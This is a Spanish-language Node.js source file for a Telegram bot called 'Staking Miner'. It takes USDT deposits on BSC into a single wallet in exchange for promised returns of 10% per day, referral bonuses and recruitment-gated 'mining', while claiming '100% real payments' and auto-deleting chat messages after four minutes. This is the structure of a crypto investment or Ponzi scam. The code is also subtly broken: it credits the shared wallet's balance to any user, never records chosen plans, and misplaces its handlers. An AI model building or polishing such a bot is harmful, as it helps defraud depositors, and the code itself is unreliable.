// === STAKING MINER BOT ===
// Versión final con depósitos y retiros automáticos reales (BSC / USDT BEP-20)

import 'dotenv/config'
import { Telegraf, Markup, session } from 'telegraf'
import { ethers } from 'ethers'
import fs from 'fs'

console.log('🚀 STAKING MINER — Iniciando bot automático...')

// === CONFIGURACIÓN DEL BOT ===
const bot = new Telegraf(process.env.TELEGRAM_TOKEN)
bot.use(session())

// === BASE DE DATOS LOCAL (users.json) ===
let users = {}
const DB_FILE = 'users.json'
if (fs.existsSync(DB_FILE)) {
  try {
    users = JSON.parse(fs.readFileSync(DB_FILE))
  } catch (e) {
    console.log('⚠️ Error leyendo DB, creando nueva...')
    users = {}
  }
}
const saveDB = () => fs.writeFileSync(DB_FILE, JSON.stringify(users, null, 2))

// === CONFIGURACIÓN WALLET ===
const privateKey = process.env.PRIVATE_KEY
if (!privateKey) throw new Error('Falta PRIVATE_KEY en .env')

const provider = new ethers.JsonRpcProvider("https://bsc-dataseed1.defibit.io/")
const wallet = new ethers.Wallet(privateKey, provider)
const BOT_WALLET = wallet.address

// === TOKEN USDT (BEP-20) ===
const USDT = new ethers.Contract(
  "0x55d398326f99059fF775485246999027B3197955",
  ["function transfer(address,uint256) external returns (bool)"],
  wallet
)

// === PLANES DE STAKING ===
const PLANES = {
  1: 0.1,
  3: 0.3,
  5: 0.5,
  10: 1.0,
  20: 2.0,
  30: 3.0,
  50: 5.0
}

// === TECLADO PRINCIPAL ===
const mainKeyboard = Markup.keyboard([
  ['💎 Staking', '⚙️ Minería'],
  ['📊 Ganancias', '💵 Retiro'],
  ['👥 Referidos', '🆘 Soporte']
]).resize()
  // === MENÚ PRINCIPAL ===
const mainMenu = (ctx) => {
  ctx.replyWithHTML(
    `<b>STAKING MINER</b>\nPagos 100% reales · Mínimo retiro 1 USDT.`,
    mainKeyboard
  )
}

// === /start ===
bot.start(async (ctx) => {
  const id = ctx.from.id.toString()
  const ref = ctx.message?.text.split(' ')[1] || null

  if (!users[id]) {
    const code = Math.floor(1000 + Math.random() * 9000)
    users[id] = {
      balance: 0,
      planes: [],
      referidos: 0,
      refValidos: 0,
      lastMine: 0,
      verified: false,
      code,
      inviter: ref
    }
    saveDB()

    await ctx.reply(
      `🧾 <b>VERIFICACIÓN DE CUENTA</b>\n\nEscribe este código para verificar tu cuenta:\n<code>${code}</code>`,
      { parse_mode: 'HTML' }
    )

    if (ref && users[ref]) {
      users[ref].referidos += 1
      users[ref].balance += 0.02
      saveDB()
      bot.telegram.sendMessage(ref, "👥 Nuevo referido +0.02 USDT").catch(() => {})
    }
  } else if (!users[id].verified) {
    await ctx.reply(
      `Escribe tu código de verificación:\n<code>${users[id].code}</code>`,
      { parse_mode: 'HTML' }
    )
  } else {
    mainMenu(ctx)
  }
})

// === VERIFICACIÓN DEL CÓDIGO ===
bot.on('text', async (ctx) => {
  const id = ctx.from.id.toString()
  const text = ctx.message.text.trim()

  if (users[id] && !users[id].verified && text === users[id].code.toString()) {
    users[id].verified = true
    delete users[id].code
    saveDB()
    await ctx.reply('✅ Verificación completada correctamente.')
    return mainMenu(ctx)
  }

  if (!users[id]?.verified) return
    // === FUNCIONES DE LOS BOTONES DEL MENÚ ===

  // 📊 GANANCIAS
  bot.hears('📊 Ganancias', async (ctx) => {
    const u = users[ctx.from.id];
    const balance = (u?.balance || 0).toFixed(3);
    ctx.replyWithMarkdown(`📊 *Tu balance actual:* ${balance} USDT`);
  });

  // 💵 RETIRO
  bot.hears('💵 Retiro', async (ctx) => {
    const u = users[ctx.from.id];
    if ((u?.balance || 0) < 1) return ctx.reply('⚠️ El mínimo de retiro es 1 USDT.');
    ctx.reply('💰 Envía tu wallet BEP-20 para procesar el retiro automático.');
    ctx.session.waitingWallet = true;
  });

  // 💎 STAKING
  bot.hears('💎 Staking', async (ctx) => {
    ctx.reply('Selecciona un plan:', Markup.inlineKeyboard([
      [
        Markup.button.callback('1 USDT → 0.1/día', 'plan1'),
        Markup.button.callback('3 USDT → 0.3/día', 'plan3')
      ],
      [
        Markup.button.callback('5 USDT → 0.5/día', 'plan5'),
        Markup.button.callback('10 USDT → 1/día', 'plan10')
      ],
      [
        Markup.button.callback('20 USDT → 2/día', 'plan20'),
        Markup.button.callback('30 USDT → 3/día', 'plan30')
      ],
      [Markup.button.callback('50 USDT → 5/día', 'plan50')]
    ]));
  });

  // ⚙️ MINERÍA
  bot.hears('⚙️ Minería', async (ctx) => {
    const u = users[ctx.from.id];
    if (!u || u.refValidos < 5)
      return ctx.reply(`⚠️ Necesitas 5 referidos válidos para activar la minería.\nTienes ${u?.refValidos || 0}/5`);
    const puede = Date.now() - (u.lastMine || 0) >= 86400000;
    ctx.reply(puede ? '*¡RECLAMA 0.03 USDT!*' : '⏳ Espera 24 horas para minar de nuevo.', {
      parse_mode: 'Markdown',
      reply_markup: puede
        ? { inline_keyboard: [[{ text: 'RECLAMAR', callback_data: 'mine' }]] }
        : null
    });
  });

  // 👥 REFERIDOS
  bot.hears('👥 Referidos', async (ctx) => {
    const me = await bot.telegram.getMe();
    const link = `https://t.me/${me.username}?start=${ctx.from.id}`;
    const u = users[ctx.from.id];
    ctx.replyWithMarkdown(`👥 *Referidos*\nTotal: ${u?.referidos || 0}\nActivos: ${u?.refValidos || 0}\n\nTu enlace:\n[Invita a tus amigos](${link})`);
  });

  // 🆘 SOPORTE
  bot.hears('🆘 Soporte', (ctx) => {
    ctx.reply('🧩 Soporte → @StankingMiner');
  });

}) // ← cierre del bot.on('text', async (ctx) => { … })
            // === BOTONES INLINE ===
bot.action(/plan(\d+)/, async (ctx) => {
  const monto = Number(ctx.match[1]);
  await ctx.answerCbQuery();
  await ctx.replyWithMarkdown(
    `💎 *Plan seleccionado:* ${monto} USDT\n\nEnvía exactamente *${monto}.000000 USDT* a:\n\`${BOT_WALLET}\`\n\n🕵️‍♂️ El sistema detectará el depósito automáticamente.`,
    { parse_mode: 'Markdown' }
  );
});

bot.action('mine', async (ctx) => {
  const id = ctx.from.id.toString();
  const u = users[id];
  if (Date.now() - (u.lastMine || 0) >= 86400000) {
    u.balance += 0.03;
    u.lastMine = Date.now();
    saveDB();
    await ctx.answerCbQuery('+0.03 USDT añadidos');
    await ctx.reply('✅ Has reclamado tus 0.03 USDT de minería.');
  } else {
    await ctx.answerCbQuery('⏳ Espera 24h para volver a minar.');
  }
});
// === DETECTOR DE DEPÓSITOS ===
setInterval(async () => {
  for (const id in users) {
    const u = users[id];
    if (!u.verified) continue;

    try {
      const balance = await provider.getBalance(u.walletAddress || BOT_WALLET);
      const amount = Number(ethers.formatEther(balance));

      if (amount >= 1 && !u.lastDepositChecked) {
        u.balance += amount;
        u.lastDepositChecked = Date.now();
        saveDB();

        bot.telegram.sendMessage(id, `✅ Depósito detectado: +${amount} USDT`);
      }
    } catch (err) {
      console.log('Error verificando depósito:', err);
    }
  }
}, 60000); // cada minuto
// === RETIRO AUTOMÁTICO ===
bot.on('text', async (ctx) => {
  const id = ctx.from.id.toString();
  const text = ctx.message.text.trim();

  if (ctx.session.waitingWallet) {
    const u = users[id];
    const to = text;
    const amount = Number((u.balance || 0).toFixed(3));

    if (amount < 1) {
      ctx.reply('⚠️ No tienes saldo suficiente.');
      ctx.session.waitingWallet = false;
      return;
    }

    try {
      const tx = await USDT.transfer(to, ethers.parseUnits(amount.toString(), 18));
      await tx.wait();

      u.balance = 0;
      saveDB();
      ctx.reply(`✅ Retiro enviado correctamente.\n🔗 Hash: ${tx.hash}`);
      ctx.session.waitingWallet = false;
    } catch (e) {
      ctx.reply('❌ Error al procesar el retiro.');
      console.log('Error en retiro:', e);
    }
  }
});
// === CÁLCULO DE RECOMPENSAS DIARIAS (STAKING) ===
setInterval(() => {
  for (const id in users) {
    const u = users[id];
    if (!u.planes?.length) continue;

    let ganancia = 0;
    u.planes.forEach(p => {
      if (Date.now() - p.start < 20 * 86400000) {
        ganancia += p.daily;
      }
    });

    u.balance += ganancia;
    saveDB();
  }
}, 86400000); // cada 24h
// === ACTUALIZACIÓN MINERÍA ===
setInterval(() => {
  for (const id in users) {
    const u = users[id];
    if (u.refValidos >= 5 && Date.now() - (u.lastMine || 0) >= 86400000) {
      u.balance += 0.03;
      u.lastMine = Date.now();
      saveDB();
      bot.telegram.sendMessage(id, '💎 Recompensa diaria de minería añadida (+0.03 USDT)');
    }
  }
}, 3600000); // cada hora revisa
// === LIMPIEZA AUTOMÁTICA DE MENSAJES ===
bot.on('message', async (ctx, next) => {
  setTimeout(() => {
    ctx.deleteMessage().catch(() => {});
  }, 4 * 60 * 1000); // cada 4 minutos
  next();
});

// === BOTÓN DE REGRESAR ===
bot.action('back', (ctx) => {
  ctx.deleteMessage().catch(() => {});
  mainMenu(ctx);
});
// === INICIO DEL BOT ===
bot.launch()
console.log('🤖 Bot StakingMiner corriendo con éxito.')

// Manejo de salida segura
process.once('SIGINT', () => bot.stop('SIGINT'))
process.once('SIGTERM', () => bot.stop('SIGTERM'))
